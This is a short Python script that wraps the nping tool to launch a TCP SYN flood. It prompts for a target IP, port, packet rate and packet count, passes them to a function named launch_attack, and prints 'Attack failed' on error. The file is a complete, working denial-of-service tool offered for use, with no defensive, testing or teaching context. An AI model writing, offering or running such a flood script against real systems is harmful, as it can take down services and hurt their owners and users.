import subprocess

def launch_attack(target_ip, target_port, rate, count):
    try:
        subprocess.run([
            "nping", "--tcp", "--dest-port", str(target_port), "--flags", "syn", "--rate", str(rate), "--count", str(count), target_ip
        ], check=True)
    except subprocess.CalledProcessError as e:
        print("Attack failed:", e)
    except EnvironmentError as e:
        print(e)

if __name__ == "__main__":
    target_ip = input("Target IP: ")
    target_port = input("Target Port: ")
    rate = input("Rate of packets per second: ")
    count = input("Total number of packets to send: ")

    launch_attack(target_ip, target_port, rate, count)
